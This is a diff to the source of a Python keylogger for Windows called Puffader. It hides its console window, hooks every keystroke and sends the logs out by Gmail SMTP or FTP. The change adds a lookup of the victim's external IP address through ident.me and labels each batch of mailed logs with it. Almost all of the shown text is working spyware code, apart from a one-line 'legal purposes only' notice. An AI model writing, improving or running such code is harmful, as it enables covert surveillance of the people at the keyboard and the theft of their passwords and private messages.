@@ -8,14 +8,14 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only!
 '''
 
-import smtplib, time, os, threading, sys, subprocess
+import smtplib, time, os, threading, sys, subprocess, urllib.request
 import win32console, win32gui, win32event, win32api, winerror
 from win32con import VK_CAPITAL; from sys import exit; from ftplib import FTP
 try:
     import pythoncom, pyHook
     from pyHook import GetKeyState, HookConstants
 except ImportError:
-    print("required pyhook and py2win32")
+    print("required pyhook and pywin32")
     exit()
 
 strEmailAc = "email@gmail.com"
@@ -46,12 +46,20 @@ objTimer = threading.Timer(0, hide);objTimer.start()
 # open file in notepad if argument is given
 if len(sys.argv) == 2:
     OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", sys.argv[1]])
-    
+
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     exit()
+
+def GetExIp(): # function to get external ip
+    try:
+        ip = urllib.request.urlopen('http://ident.me').read().decode('utf8')
+        return ip
+    except:
+        return "?"
+strExIP = GetExIp()
 
 blnStop = "False"
 
@@ -62,14 +70,14 @@ def OnKeyboardEvent(event):
     except NameError:
         strLogs = ""
 
-    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
+    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP):
         try:
             if blnStop == "True":
                 strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
             else:
                 strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                 strMessage = strDateTime + "\n\n" + strLogs
-                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
+                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)
 
                 SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                 SmtpServer.ehlo()   # identifies you to the smtp server
@@ -125,7 +133,7 @@ def OnKeyboardEvent(event):
             SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
             SendFTPThread.start()
         else:
-            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
+            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True", strExIP))
             SendMailThread.start()
         exit()
 
@@ -169,7 +177,7 @@ def OnKeyboardEvent(event):
                 SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
                 SendFTPThread.start()
             else:
-                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
+                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop, strExIP))
                 SendMailThread.start()
 
     if blnUseTime == "True":  # if the user is sending messages by timer
